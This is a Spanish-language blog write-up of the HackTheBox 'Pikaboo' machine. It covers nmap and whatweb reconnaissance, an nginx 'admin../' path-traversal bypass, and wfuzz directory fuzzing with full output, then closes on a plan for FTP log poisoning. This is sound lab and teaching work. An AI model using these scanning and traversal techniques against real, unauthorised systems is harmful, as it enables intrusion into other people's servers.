<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>            Pikaboo HackTheBox - Blog Ciberseguridad      Writeups      </title>
<meta name="description" content="Buenas a todos, en esta ocasión resolveremos una máquina Linux llamada “Pikaboo” la cual está catalogada como Hard en la plataforma de HackTheBox, disfruten el contenido.">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_Arg">
<meta property="og:site_name" content="Blog Ciberseguridad | Writeups">
<meta property="og:title" content="Pikaboo HackTheBox">
<meta property="og:url" content="http://localhost:4000/writeup-Pikaboo/">


  <meta property="og:description" content="Buenas a todos, en esta ocasión resolveremos una máquina Linux llamada “Pikaboo” la cual está catalogada como Hard en la plataforma de HackTheBox, disfruten el contenido.">



  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-pikaboo/logo.jpg">





  <meta property="article:published_time" content="2023-11-12T00:00:00+00:00">





  

  


<link rel="canonical" href="http://localhost:4000/writeup-Pikaboo/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "Vo1dN3t",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Blog Ciberseguridad | Writeups Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/" alt=""></a>
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Posts</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categories</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Tags</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >About</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Pikaboo HackTheBox</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/perfil2.jpg" alt="Vo1dN3t" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Vo1dN3t</h3>
    
    
      <p class="author__bio" itemprop="description">
        Entusiasta del Hacking y CTFs<br>Ethical Hacker | RedTeam
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Argentina</span>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://github.com/Voidnet01" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Pikaboo HackTheBox">
    <meta itemprop="description" content="Buenas a todos, en esta ocasión resolveremos una máquina Linux llamada “Pikaboo” la cual está catalogada como Hard en la plataforma de HackTheBox, disfruten el contenido.">
    <meta itemprop="datePublished" content="November 12, 2023">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Pikaboo HackTheBox
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2023-11-12T00:00:00+00:00">November 12, 2023 </time>&emsp;
          
          
        </p>
        <p>Buenas a todos, en esta ocasión resolveremos una máquina Linux llamada “Pikaboo” la cual está catalogada como Hard en la plataforma de HackTheBox, disfruten el contenido.</p>

<p><img src="/assets/images/htb-writeup-pikaboo/imagen.png" alt="" /></p>

<hr />

<p>Primero le lanzamos un Nmap para ver que puertos abiertos tiene la máquina.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="err">❯</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sS</span> <span class="o">-</span><span class="n">Pn</span> <span class="o">-</span><span class="n">vvv</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">5000</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.249</span>
<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.94</span><span class="n">SVN</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">12</span> <span class="mi">19</span><span class="p">:</span><span class="mi">10</span> <span class="n">GMT</span>
<span class="n">Initiating</span> <span class="n">SYN</span> <span class="n">Stealth</span> <span class="n">Scan</span> <span class="n">at</span> <span class="mi">19</span><span class="p">:</span><span class="mi">10</span>
<span class="n">Scanning</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.249</span> <span class="p">[</span><span class="mi">65535</span> <span class="n">ports</span><span class="p">]</span>
<span class="n">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.249</span>
<span class="n">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">21</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.249</span>
<span class="n">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.249</span>
<span class="n">Completed</span> <span class="n">SYN</span> <span class="n">Stealth</span> <span class="n">Scan</span> <span class="n">at</span> <span class="mi">19</span><span class="p">:</span><span class="mi">11</span><span class="p">,</span> <span class="mf">14.23</span><span class="n">s</span> <span class="n">elapsed</span> <span class="p">(</span><span class="mi">65535</span> <span class="n">total</span> <span class="n">ports</span><span class="p">)</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.249</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span><span class="p">,</span> <span class="n">received</span> <span class="n">user</span><span class="o">-</span><span class="nb">set</span> <span class="p">(</span><span class="mf">0.26</span><span class="n">s</span> <span class="n">latency</span><span class="p">).</span>
<span class="n">Scanned</span> <span class="n">at</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">12</span> <span class="mi">19</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">56</span> <span class="n">GMT</span> <span class="k">for</span> <span class="mi">14</span><span class="n">s</span>
<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">65532</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">reset</span><span class="p">)</span>
<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">REASON</span>
<span class="mi">21</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ftp</span>     <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">63</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>     <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">63</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">63</span>

<span class="n">Read</span> <span class="n">data</span> <span class="n">files</span> <span class="k">from</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">nmap</span>
<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">14.33</span> <span class="n">seconds</span>
           <span class="n">Raw</span> <span class="n">packets</span> <span class="n">sent</span><span class="p">:</span> <span class="mi">68629</span> <span class="p">(</span><span class="mf">3.020</span><span class="n">MB</span><span class="p">)</span> <span class="o">|</span> <span class="n">Rcvd</span><span class="p">:</span> <span class="mi">68604</span> <span class="p">(</span><span class="mf">2.744</span><span class="n">MB</span><span class="p">)</span>

</code></pre></div></div>
<p>Sigamos con el escaneo para poder identificar qué servicios corre en cada puerto.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="err">❯</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p21</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="mi">80</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.249</span>
<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.94</span><span class="n">SVN</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">12</span> <span class="mi">19</span><span class="p">:</span><span class="mi">14</span> <span class="n">GMT</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.249</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.26</span><span class="n">s</span> <span class="n">latency</span><span class="p">).</span>

<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
<span class="mi">21</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ftp</span>     <span class="n">vsftpd</span> <span class="mf">3.0</span><span class="p">.</span><span class="mi">3</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>     <span class="n">OpenSSH</span> <span class="mf">7.9</span><span class="n">p1</span> <span class="n">Debian</span> <span class="mi">10</span><span class="o">+</span><span class="n">deb10u2</span> <span class="p">(</span><span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span> 
<span class="o">|</span>   <span class="mi">2048</span> <span class="mi">17</span><span class="p">:</span><span class="n">e1</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="n">fe</span><span class="p">:</span><span class="mi">66</span><span class="p">:</span><span class="mi">6</span><span class="n">d</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="n">b6</span><span class="p">:</span><span class="mi">90</span><span class="p">:</span><span class="mi">68</span><span class="p">:</span><span class="n">d0</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">54</span><span class="p">:</span><span class="mi">2</span><span class="n">e</span><span class="p">:</span><span class="n">e2</span><span class="p">:</span><span class="mi">9</span><span class="n">f</span> <span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
<span class="o">|</span>   <span class="mi">256</span> <span class="mi">92</span><span class="p">:</span><span class="mi">86</span><span class="p">:</span><span class="mi">54</span><span class="p">:</span><span class="n">f7</span><span class="p">:</span><span class="n">cc</span><span class="p">:</span><span class="mi">5</span><span class="n">a</span><span class="p">:</span><span class="mi">1</span><span class="n">a</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="n">fe</span><span class="p">:</span><span class="n">c6</span><span class="p">:</span><span class="mi">09</span><span class="p">:</span><span class="n">cc</span><span class="p">:</span><span class="n">e5</span><span class="p">:</span><span class="mi">7</span><span class="n">c</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="n">c3</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="n">f4</span><span class="p">:</span><span class="n">cd</span><span class="p">:</span><span class="mi">6</span><span class="n">f</span><span class="p">:</span><span class="mi">3</span><span class="n">b</span><span class="p">:</span><span class="mi">19</span><span class="p">:</span><span class="mi">9</span><span class="n">c</span><span class="p">:</span><span class="n">cf</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="n">c6</span><span class="p">:</span><span class="mi">6</span><span class="n">d</span><span class="p">:</span><span class="n">a5</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">6</span><span class="n">a</span><span class="p">:</span><span class="mi">61</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mi">42</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="n">nginx</span> <span class="mf">1.14</span><span class="p">.</span><span class="mi">2</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Pikaboo</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">nginx</span><span class="o">/</span><span class="mf">1.14</span><span class="p">.</span><span class="mi">2</span>
<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OSs</span><span class="p">:</span> <span class="n">Unix</span><span class="p">,</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span>

</code></pre></div></div>
<hr />

<h2 id="enumeración">Enumeración</h2>

<p>Vemos que el puerto 21 osea el ftp esta abierto, nos conectaremos con el usuario Anonymous.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="err">❯</span> <span class="n">ftp</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.249</span>
<span class="n">Connected</span> <span class="n">to</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.249</span><span class="p">.</span>
<span class="mi">220</span> <span class="p">(</span><span class="n">vsFTPd</span> <span class="mf">3.0</span><span class="p">.</span><span class="mi">3</span><span class="p">)</span>
<span class="n">Name</span> <span class="p">(</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">10.249</span><span class="p">:</span><span class="n">void</span><span class="p">):</span> <span class="n">anonymous</span>
<span class="mi">331</span> <span class="n">Please</span> <span class="n">specify</span> <span class="n">the</span> <span class="n">password</span><span class="p">.</span>
<span class="n">Password</span><span class="p">:</span> 
<span class="mi">530</span> <span class="n">Login</span> <span class="n">incorrect</span><span class="p">.</span>
<span class="n">ftp</span><span class="p">:</span> <span class="n">Login</span> <span class="n">failed</span>
<span class="n">ftp</span><span class="o">&gt;</span> 

</code></pre></div></div>
<p>Necesitaremos credenciales para acceder.</p>

<p>Támbien vemos que el puerto 80 está abierto, podemos lanzarle un WhatWeb para ver qué tecnologías corren por detrás.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="err">❯</span> <span class="n">whatweb</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">10.249</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">10.249</span> <span class="p">[</span><span class="mi">200</span> <span class="n">OK</span><span class="p">]</span> <span class="n">Bootstrap</span><span class="p">,</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">HTML5</span><span class="p">,</span> <span class="n">HTTPServer</span><span class="p">[</span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.14</span><span class="p">.</span><span class="mi">2</span><span class="p">],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">10.249</span><span class="p">],</span> <span class="n">Script</span><span class="p">,</span> <span class="n">Title</span><span class="p">[</span><span class="n">Pikaboo</span><span class="p">],</span> <span class="n">nginx</span><span class="p">[</span><span class="mf">1.14</span><span class="p">.</span><span class="mi">2</span><span class="p">]</span>

</code></pre></div></div>

<p>Accedamos a la página web para poder analizarla un poco.</p>

<p><img src="/assets/images/htb-writeup-pikaboo/web.png" alt="" /></p>

<p>Si vamos a Pokatdex nos encontramos con esto:</p>

<p><img src="/assets/images/htb-writeup-pikaboo/web2.jpg" alt="" /></p>

<p>Podemos ver que hay un apartado “Admin”, si entramos nos podemos encontrar con un panel de login.</p>

<p><img src="/assets/images/htb-writeup-pikaboo/panel.jpg" alt="" /></p>

<p>Intenté entrar usando credenciales predeterminadas como “admin:admin”, “guest:guest” y “admin:password”, pero no obtuve resultados.</p>

<p>Si buscamos en HackTricks la versión de Ngnix que nos habia reportado whatweb podemos ver algo bastante interesante.</p>

<p><img src="/assets/images/htb-writeup-pikaboo/hacktricks.jpg" alt="" /></p>

<p>Intentemos aplicar el “../” en el apartado “Admin” a ver que sucede.</p>

<p><img src="/assets/images/htb-writeup-pikaboo/admin.jpg" alt="" /></p>

<p>Y vemos que nos dice “Forbidden”.</p>

<p>Apliquemos fuzzing para ver si encontramos algo interesante.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="err">❯</span> <span class="n">wfuzz</span> <span class="o">-</span><span class="n">c</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">dirbuster</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="nb">list</span><span class="o">-</span><span class="mf">2.3</span><span class="o">-</span><span class="n">medium</span><span class="p">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">10.249</span><span class="o">/</span><span class="n">admin</span><span class="p">..</span><span class="o">/</span><span class="n">FUZZ</span> <span class="o">--</span><span class="n">hc</span><span class="o">=</span><span class="mi">404</span><span class="p">,</span><span class="mi">401</span> <span class="o">-</span><span class="n">t</span> <span class="mi">200</span>
 <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="o">/</span><span class="n">dist</span><span class="o">-</span><span class="n">packages</span><span class="o">/</span><span class="n">wfuzz</span><span class="o">/</span><span class="n">__init__</span><span class="p">.</span><span class="n">py</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span> <span class="nb">UserWarning</span><span class="p">:</span><span class="n">Pycurl</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">compiled</span> <span class="n">against</span> <span class="n">Openssl</span><span class="p">.</span> <span class="n">Wfuzz</span> <span class="n">might</span> <span class="ow">not</span> <span class="n">work</span> <span class="n">correctly</span> <span class="n">when</span> <span class="n">fuzzing</span> <span class="n">SSL</span> <span class="n">sites</span><span class="p">.</span> <span class="n">Check</span> <span class="n">Wfuzz</span><span class="s">'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.249/admin../FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                    
=====================================================================

000000004:   403        9 L      28 W       274 Ch      "#"                                                                                                                                        
000000002:   403        9 L      28 W       274 Ch      "#"                                                                                                                                        
000000005:   403        9 L      28 W       274 Ch      "# This work is licensed under the Creative Commons"                                                                                       
000000009:   403        9 L      28 W       274 Ch      "# Suite 300, San Francisco, California, 94105, USA."                                                                                      
000000008:   403        9 L      28 W       274 Ch      "# or send a letter to Creative Commons, 171 Second Street,"                                                                               
000000010:   403        9 L      28 W       274 Ch      "#"                                                                                                                                        
000000011:   403        9 L      28 W       274 Ch      "# Priority ordered case sensative list, where entries were found"                                                                         
000000012:   403        9 L      28 W       274 Ch      "# on atleast 2 different hosts"                                                                                                           
000000013:   403        9 L      28 W       274 Ch      "#"                                                                                                                                        
000000014:   403        9 L      28 W       274 Ch      "http://10.10.10.249/admin../"                                                                                                             
000000006:   403        9 L      28 W       274 Ch      "# Attribution-Share Alike 3.0 License. To view a copy of this"                                                                            
000000001:   403        9 L      28 W       274 Ch      "# directory-list-2.3-medium.txt"                                                                                                          
000000003:   403        9 L      28 W       274 Ch      "# Copyright 2007 James Fisher"                                                                                                            
000000007:   403        9 L      28 W       274 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                                          
000001073:   301        9 L      28 W       314 Ch      "javascript"    &lt;--                                                                                                                           
000045240:   403        9 L      28 W       274 Ch      "http://10.10.10.249/admin../"                                                                                                             
000095524:   200        105 L    302 W      5299 Ch     "server-status" &lt;--
</span></code></pre></div></div>
<p>Encontramos directorios interesantes, si volvemos a la web y colocamos “javascript” nos devuelve lo siguiente:</p>

<p><img src="/assets/images/htb-writeup-pikaboo/javascript.jpg" alt="" /></p>

<p>Probemos colocar “server-startus”.</p>

<p><img src="/assets/images/htb-writeup-pikaboo/status.jpg" alt="" /></p>

<p>Mirando un poco los directorios que nos muestra la web, hay una que me llamó la atención y es “/admin_staging”</p>

<p>Podemos ver que nos aplica un “Redirect”.</p>

<p><img src="/assets/images/htb-writeup-pikaboo/redirect.jpg" alt="" /></p>

<p>Lo que podemos intentar es hacer fuzzing.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
❯ wfuzz <span class="nt">-c</span> <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-u</span> http://10.10.10.249/admin../admin_staging/FUZZ <span class="nt">--hc</span><span class="o">=</span>404,401 <span class="nt">-t</span> 200
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.249/admin../admin_staging/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                    
=====================================================================

000000007:   200        882 L    2267 W     40554 Ch    "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                                          
000000090:   301        9 L      28 W       322 Ch      "docs"       &lt;----                                                                                                                              
000000001:   200        882 L    2267 W     40554 Ch    "# directory-list-2.3-medium.txt"                                                                                                          
000000014:   200        882 L    2267 W     40554 Ch    "http://10.10.10.249/admin../admin_staging/"                                                                                               
000000003:   200        882 L    2267 W     40554 Ch    "# Copyright 2007 James Fisher"                                                                                                            
000000004:   200        882 L    2267 W     40554 Ch    "#"                                                                                                                                        
000000002:   200        882 L    2267 W     40554 Ch    "#"                                                                                                                                        
000000005:   200        882 L    2267 W     40554 Ch    "# This work is licensed under the Creative Commons"                                                                                       
000000006:   200        882 L    2267 W     40554 Ch    "# Attribution-Share Alike 3.0 License. To view a copy of this"                                                                            
000000013:   200        882 L    2267 W     40554 Ch    "#"                                                                                                                                        
000000012:   200        882 L    2267 W     40554 Ch    "# on atleast 2 different hosts"                                                                                                           
000000011:   200        882 L    2267 W     40554 Ch    "# Priority ordered case sensative list, where entries were found"                                                                         
000000010:   200        882 L    2267 W     40554 Ch    "#"                                                                                                                                        
000000009:   200        882 L    2267 W     40554 Ch    "# Suite 300, San Francisco, California, 94105, USA."                                                                                      
000000008:   200        882 L    2267 W     40554 Ch    "# or send a letter to Creative Commons, 171 Second Street,"                                                                               
000000291:   301        9 L      28 W       324 Ch      "assets" &lt;---

</span></code></pre></div></div>
<p>Y vemos que nos reportó docs y assets, si nos fijamos en el WhatWeb podemos ver que la página interpreta php.</p>

<p>Con Wfuzz buscaremos archivos con extensión php.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-u</span> http://10.10.10.249/admin../admin_staging/FUZZ.php <span class="nt">--hc</span><span class="o">=</span>404,401 <span class="nt">-t</span> 200
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.249/admin../admin_staging/FUZZ.php
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                    
=====================================================================

000000014:   403        9 L      28 W       274 Ch      "http://10.10.10.249/admin../admin_staging/.php"                                                                                           
000000125:   200        210 L    498 W      9627 Ch     "user"    &lt;----                                                                                                                           
000000001:   200        882 L    2267 W     40554 Ch    "# directory-list-2.3-medium.txt"                                                                                                          
000000003:   200        882 L    2267 W     40554 Ch    "# Copyright 2007 James Fisher"                                                                                                            
000000007:   200        882 L    2267 W     40554 Ch    "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                                          
000000015:   200        882 L    2267 W     40554 Ch    "index"    &lt;----                                                                                                                             
000000013:   200        882 L    2267 W     40554 Ch    "#"                                                                                                                                        
000000012:   200        882 L    2267 W     40554 Ch    "# on atleast 2 different hosts"                                                                                                           
000000011:   200        882 L    2267 W     40554 Ch    "# Priority ordered case sensative list, where entries were found"                                                                         
000000010:   200        882 L    2267 W     40554 Ch    "#"                                                                                                                                        
000000009:   200        882 L    2267 W     40554 Ch    "# Suite 300, San Francisco, California, 94105, USA."                                                                                      
000000006:   200        882 L    2267 W     40554 Ch    "# Attribution-Share Alike 3.0 License. To view a copy of this"                                                                            
000000008:   200        882 L    2267 W     40554 Ch    "# or send a letter to Creative Commons, 171 Second Street,"                                                                               
000000005:   200        882 L    2267 W     40554 Ch    "# This work is licensed under the Creative Commons"                                                                                       
000000002:   200        882 L    2267 W     40554 Ch    "#"                                                                                                                                        
000000004:   200        882 L    2267 W     40554 Ch    "#"                                                                                                                                        
000000085:   200        803 L    4235 W     71643 Ch    "info"    &lt;---                                                                                                                          
000002927:   200        515 L    1218 W     25205 Ch    "dashboard"  &lt;---                                                                                                                              
000003719:   200        376 L    589 W      13778 Ch    "tables" &lt;---

</span></code></pre></div></div>
<p>Tenemos varios directorios interesante, probé con “dashboard”, “tables”, “info” y user pero no encontré nada, si probamos con index.php podemos ver lo siguiente:</p>

<p><img src="/assets/images/htb-writeup-pikaboo/panel.jpg" alt="" /></p>

<p>Si vamos a User profile y nos fijamos en la url podemos ver algo interesante.</p>

<p><img src="/assets/images/htb-writeup-pikaboo/panel2.jpg" alt="" /></p>

<p>Probé si es vulnerable a LFI pero no obtuve resultados, la web no me muestra nada.</p>

<p><img src="/assets/images/htb-writeup-pikaboo/panel3.jpg" alt="" /></p>

<p>Recordemos que el puerto 21 esta abierto, lo que podriamos hacer es enumerar los “Log” e intentar hacer un “Log poisoning”.</p>

<hr />

